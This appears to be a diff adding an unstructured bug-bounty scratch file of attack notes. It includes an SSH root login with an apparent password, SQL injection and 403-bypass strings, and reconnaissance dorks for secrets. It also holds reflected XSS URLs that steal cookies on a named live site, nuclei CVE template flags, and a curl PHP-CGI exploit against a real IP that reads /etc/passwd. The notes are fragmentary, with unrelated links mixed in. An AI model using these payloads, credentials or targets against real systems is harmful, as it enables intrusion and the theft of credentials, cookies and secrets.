@@ -1,0 +1,98 @@
+0922655997
+
+ssh root@161.35.104.11
+12345@Hh
+
+
+.*\.test\.com$
+
+.*\.test\.*$
+
+" or 1=1 -- -//
+
+https://dencode.com/
+
+
+403 bypass :-
+test.com/%2e/secret
+
+
+https://web.archive.org/cdx/search/cdx?url=*.classdojo
+
+https://web.archive.org/cdx/search/cdx?url=*.splitwaiting.lv.com&fl=original&collapse=urlkey
+
+site:example.com inurl:admin/login.php
+
+______________________________________________________________________________
+
+______________________________________________________________________________
+
+79c5857c0d061daf
+bd210b16b818f2d4
+01f5e2cf64ea91da
+bce9ef3fe9dc03ba
+143761d057ba8d3c
+
+
+C8KAE9SKSJ1XESJ9E3RYXHAE
+
+
+Hacker :-  8744
+
+
+
+Victim :- 8745
+
+
+https://infosecwriteups.com/how-i-got-owned-a-multi-billion-dollar-retailers-mysql-databases-using-simple-sql-injection-30f8b0dfd9ce
+
+
+
+
+
+
+
+(1,alert)(7*7)]
+
+
+
+
+
+_________________________________________________________________________________________
+
+https://www.fintech.net/fms/join/signup_step1.asp?error=hello&errortype=1&account=fff%22%3E%22%3E%3Cimg%20src=x%20onerror=alert(document.cookie)%3E%3C/h1%3E&zip=12345
+
+
+https://www.fintech.net/fms/join/signup_step1.asp?error=hello&errortype=1&account=f&zip=ff%22%3E%22%3E%3Cimg%20src=x%20onerror=alert(document.cookie)%3E%3C/h1%3E
+
+
+
+
+-t /root/nuclei-templates/http/cves/2017/CVE-2017-12149.yaml -t /root/nuclei-templates/http/cves/2019/CVE-2019-15043.yaml -t /root/nuclei-templates/http/cves/2023/CVE-2023-24488.yaml -t /root/nuclei-templates/http/cves/2017/CVE-2017-9140.yaml -t /root/nuclei-templates/http/cves/2023/CVE-2023-38035.yaml -t /root/nuclei-templates/http/cves/2021/CVE-2021-38314.yaml
+
+
+https://medium.com/@nireshpandian19/no-easy-p1s-on-the-fly-if-your-site-runs-wp-or-drupal-a7700650f86b
+
+https://news.elsob7.com/643198/%D9%83%D9%85-%D8%AA%D9%83%D8%A7%D9%84%D9%8A%D9%81-%D8%A7%D9%84%D8%B3%D9%81%D8%B1-%D8%A8%D8%B9%D8%AF-%D8%A7%D9%84%D9%81%D9%88%D8%B2-%D9%81%D9%8A-%D8%A7%D9%84%D9%82%D8%B1%D8%B9%D8%A9-%D8%A7%D9%84%D8%A3/
+
+
+
+org:google secret language:Python
+
+https://github.com/google/pigweed/blob/5eaf9390ee779a714634d37d8d7c8ab620417261/pw_cli_analytics/py/pw_cli_analytics/config.py#L36
+
+
+
+
+https://www.amazfit.com/wpm@d9f539ffw0e1474c4pae8b6d69m179c86ad/web-pixel-shopify-app-pixel@0220/sandbox/worker.modern.js  (api key)
+
+
+with curl
+50.21.172.195 = host :-  ua-195.metrooptic.com
+
+
+https://www.shodan.io/host/50.21.172.195
+
+http://50.21.172.195/
+
+curl -sk "http://50.21.172.195//?PHPRC=/dev/fd/0" -X POST -d 'auto_prepend_file="/etc/passwd"'
